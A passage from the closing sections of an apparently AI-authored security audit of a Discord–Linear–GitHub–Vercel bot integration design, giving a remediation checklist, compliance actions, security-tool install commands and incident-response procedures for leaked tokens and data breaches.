### Immediate Actions (Before Writing ANY Code)

1. ✅ **Implement Input Validation Framework**
   - Use dompurify, validator libraries
   - Define allowed inputs (whitelist approach)
   - Test with malicious payloads

2. ✅ **Design Authentication/Authorization System**
   - Define Discord roles
   - Map roles to permissions
   - Enforce at command entry points

3. ✅ **Choose Secrets Management Solution**
   - Use Vault, AWS Secrets Manager, or Azure Key Vault
   - If not possible: Encrypted .env with sops
   - NEVER plain .env.local in production

4. ✅ **Set Up Safe Logging**
   - Use winston with redaction
   - Never log secrets or PII
   - Secure file permissions (600)

### Before First Deployment

5. ✅ **Add Rate Limiting**
   - Bot commands: 5/min per user
   - Feedback capture: 5/hour per user
   - Linear API: 33/min with circuit breaker

6. ✅ **Webhook Signature Verification**
   - Linear webhooks: HMAC-SHA256
   - Vercel webhooks: HMAC-SHA1
   - Idempotency checks

7. ✅ **Safe Error Handling**
   - Generic user messages
   - Detailed internal logs with error IDs
   - No stack traces to users

8. ✅ **Security Testing**
   - Automated: npm audit, eslint-plugin-security
   - Manual: Try injection attacks
   - External: Penetration test if possible

### Production Hardening

9. ✅ **Monitoring & Alerting**
   - Health check endpoint
   - Error rate monitoring
   - Uptime monitoring (UptimeRobot, Pingdom)

10. ✅ **Incident Response Plan**
    - Token rotation procedure
    - Bot compromise response
    - Data breach notification process

---

## 9. COMPLIANCE CONSIDERATIONS

### GDPR (if EU users)

- ✅ Data minimization: Only collect necessary data
- ✅ Right to erasure: Delete user data on request
- ✅ Data portability: Export user data on request
- ✅ Consent: Get explicit consent for data collection
- ✅ Data breach notification: Within 72 hours

**Actions:**
- Add `/gdpr-delete-my-data` command
- Add `/gdpr-export-my-data` command
- Document data processing in privacy policy
- Implement 365-day data retention policy

### CCPA (if California users)

- ✅ Right to know: Disclose data collection
- ✅ Right to delete: Delete user data on request
- ✅ Right to opt-out: Allow disabling data collection

**Actions:**
- Add privacy policy link to Discord bot
- Implement data deletion workflow
- Add "do not track" option in user preferences

### SOC 2 (if enterprise customers)

- ✅ Access controls
- ✅ Encryption at rest and in transit
- ✅ Audit logging
- ✅ Incident response
- ✅ Business continuity

**Actions:**
- Document all security controls
- Implement audit logging for all actions
- Set up automated backups
- Create DR runbook

---

## 10. CONCLUSION

### Overall Assessment

The agentic-base organizational integration design is **well-documented but critically incomplete**. The architecture is sound in theory, but **ZERO IMPLEMENTATION CODE EXISTS**, making security assessment impossible in practice.

### Critical Gap

**The #1 issue is not any specific vulnerability, but rather: DOCUMENTATION ≠ IMPLEMENTATION**

This audit identified 20 security issues based on *proposed* implementation templates in the documentation. When actual code is written, it will likely introduce:
- Different vulnerabilities
- Missing security controls
- Configuration errors
- Logic bugs

### Final Recommendation

**DO NOT DEPLOY UNTIL:**

1. ✅ Implementation code exists and is reviewed
2. ✅ All CRITICAL findings (#1-#5) are resolved
3. ✅ All HIGH findings (#6-#10) are resolved
4. ✅ Security testing is performed
5. ✅ Full audit is re-run on actual implementation

### Estimated Remediation Effort

- **Critical Issues:** 40-60 hours development
- **High Priority:** 30-40 hours development
- **Medium Priority:** 20-30 hours development
- **Testing & Validation:** 20-30 hours
- **Total:** **110-160 hours** (~3-4 weeks for 1 developer)

### Risk Acceptance

If deploying without addressing all issues, document accepted risks:

**We accept the following risks:**
- [ ] PII may be exposed in Linear issues
- [ ] Rate limiting may be insufficient
- [ ] Secrets are stored in plaintext .env.local
- [ ] etc.

**Justification:** [Document business reasons]
**Mitigation plan:** [Document when issues will be fixed]
**Sign-off:** [Name, Date]

---

## Appendix A: Security Tools Recommendations

```bash
# Static Analysis
npm install -D eslint eslint-plugin-security
npm install -D @typescript-eslint/parser @typescript-eslint/eslint-plugin

# Dependency Scanning
npm audit
npm install -g snyk
snyk test

# Pre-commit Hooks
npm install -D husky lint-staged
brew install git-secrets  # Prevent token commits

# Runtime Security
npm install helmet  # Security headers (if using Express)
npm install express-rate-limit  # Rate limiting
npm install validator  # Input validation
npm install dompurify  # XSS prevention

# Secrets Management
# Option 1: HashiCorp Vault
brew install vault

# Option 2: SOPS (Mozilla)
brew install sops

# Option 3: AWS Secrets Manager
npm install @aws-sdk/client-secrets-manager

# Monitoring
npm install prom-client  # Prometheus metrics
npm install @sentry/node  # Error tracking

# Testing
npm install -D jest @types/jest ts-jest
npm install -D supertest  # API testing
```

---

## Appendix B: Emergency Response Procedures

### If Discord Bot Token Compromised

1. **Immediate:**
   - Delete token in Discord Developer Portal
   - Generate new token
   - Update .env.local
   - Restart bot

2. **Investigation:**
   - Check logs for unauthorized actions
   - Review Discord audit log
   - Identify how token was leaked

3. **Prevention:**
   - Rotate all tokens (Linear, GitHub, Vercel)
   - Review file permissions
   - Audit git history for accidental commits
   - Enable 2FA on all service accounts

### If Linear API Token Compromised

1. **Immediate:**
   - Revoke token in Linear settings
   - Generate new token
   - Update .env.local
   - Check Linear for unauthorized changes

2. **Investigation:**
   - Review Linear audit log
   - Check for created/modified/deleted issues
   - Verify all team members' access

### If Data Breach (PII Exposed)

1. **Immediate (<1 hour):**
   - Contain the breach (disable bot if needed)
   - Assess scope (what data, how many users)
   - Notify leadership

2. **Short-term (<24 hours):**
   - Notify affected users
   - Document incident (timeline, impact, root cause)
   - Implement immediate fix

3. **Long-term (<72 hours):**
   - File data breach reports (GDPR, CCPA if applicable)
   - Implement permanent fix
   - Update security procedures
   - Conduct post-mortem

---

## Document Metadata

**Audit Completed:** 2025-12-07
**Auditor:** Paranoid Cypherpunk Auditor Agent
**Methodology:** Design review, threat modeling, OWASP Top 10, cryptographic analysis
**Scope:** Discord, Linear, GitHub, Vercel integration architecture and documentation
**Limitations:** No implementation code exists; audit based on documentation only
**Re-audit Required:** Yes, after implementation is complete
**Confidence Level:** Medium (design review only, not penetration test)

---

**End of Security Audit Report**

**ACTION REQUIRED: Address all CRITICAL issues before writing any implementation code. Re-audit after implementation exists.**
